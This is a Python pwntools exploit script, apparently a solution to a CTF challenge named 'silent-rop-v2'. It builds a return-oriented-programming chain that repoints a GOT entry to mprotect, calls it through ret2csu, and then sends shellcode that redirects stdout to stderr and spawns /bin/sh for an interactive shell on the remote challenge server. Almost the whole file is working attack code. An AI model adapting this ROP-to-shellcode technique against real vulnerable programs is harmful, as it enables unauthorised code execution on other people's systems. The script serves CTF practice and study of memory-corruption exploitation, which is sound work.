from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep
import re
import subprocess

context.arch = "amd64"
context.word_size = 64
context.bits = 64
context.os = "linux"

file = "./chal"
exe_args = []
io: process = None
PREFIX = b"> "

speed = 0.2

def debug():
    gdb.attach(io, gdbscript=
    """
    hb *0x00000000004011d9
    """)
    input("debug")

def launch_remote():
    global file, io
    io = remote("silent-rop-v2.challs.csc.tf", 1337)

def launch_local():
    global file, io
    io = process([file, *exe_args])
    if args.GDB:
        debug()

def solve_pow():
    leak = recvu(b"===================")
    pow = getb(leak, b") solve ", b"\n").decode()
    proc = subprocess.Popen(["solvepow", "solve", pow], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    pow = proc.communicate()[0]
    sla(b"Solution? ", pow)

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
binsh = lambda: next(libc.search(b"/bin/sh\0"))
snum = lambda a, b: sla(a, str(b).encode("iso-8859-1"))
sprefix = lambda a: sla(PREFIX, a)
choice = lambda a: snum(PREFIX, a)

def launch():
    if args.REMOTE:
        l = launch_remote
    else:
        l = launch_local
    with context.local(log_level=logging.ERROR):
        l()
    if args.POW:
        solve_pow()

def getb(d, a, b):
    a_ = d.find(a)
    if a_ == -1 or a == b"": a_ = 0
    b_ = d.find(b, a_+len(a))
    if b_ == -1 or b == b"": b_ = len(d)
    return d[a_+len(a):b_]

# ================================================================
# EXPLOIT HERE
# ================================================================

with context.local(log_level=logging.ERROR):
    exe = ELF(file)
    # libc = ELF("./libc.so.6")

tries = 0
# tries_prog = log.progress("Tries")
def exploit():
    pop_rdi = 0x0000000000401293
    pop_rsi_r15 = 0x0000000000401291
    pop_rdx = 0x00000000004011e2
    rdi_into_Ordx_rsi = 0x00000000004011ed
    add_rdi_rdx = 0x00000000004011f6
    Ordx_into_rdi = 0x00000000004011e9
    csu1 = 0x0040128a
    csu_call = 0x00401279
    ret = 0x000000000040101a

    free_area = 0x0000000000404800
    bin_sh = free_area+8

    #Â they gived us gadget that can read / write memory into register and a gadget to add an offset to the register
    # so copy a got entry into a writable area with an offset so it now points to mprotect
    # use ret2csu to call that modified entry 
    # shellcode

    payload = flat([
        b"A"*0x10,
        0,
        pop_rdx,
        exe.got.read,
        Ordx_into_rdi,
        
        pop_rdx,
        0xa9e0,
        add_rdi_rdx,

        pop_rsi_r15,
        0,
        0,
        pop_rdx,
        free_area,
        rdi_into_Ordx_rsi,

        csu1,
        0,
        1,
        0,
        0,
        0,
        free_area,

        

        pop_rdi,
        (free_area + 0x100) & ~0xfff,
        pop_rsi_r15,
        0x1000,
        free_area,
        pop_rdx,
        7,
        csu_call,

        0,
        0,
        0,
        0,
        0,
        0,
        0,

        pop_rdi,
        0,
        pop_rsi_r15,
        free_area+0x100,
        0,
        pop_rdx,
        0x40,
        exe.plt.read,

        free_area + 0x100
    ])
    print(hex(len(payload)))
    sleep(speed)
    sl(payload)

    # stdout is closed at the start of the chall; but stdder is still open
    # dup2 to replace stdout with stderr

    shellcode = asm(
    f"""
    mov edi, 2
    mov esi, 1
    mov eax, 0x21
    syscall
    
    mov rax, 0x0068732f6e69622f
    push rax
    mov rdi, rsp
    xor esi, esi
    xor edx, edx
    mov eax, 0x3b
    syscall
    """)
    sleep(speed)
    sl(shellcode)

    io.interactive()
    input("end")
    exit()

launch()
exploit()
exit()

while True:
    count = 0
    tries += 1
    tries_prog.status(str(tries))

    launch()
    try:
        exploit()
    except EOFError:
        pass

    with context.local(log_level=logging.ERROR):
        io.close()
    # sleep(0.05)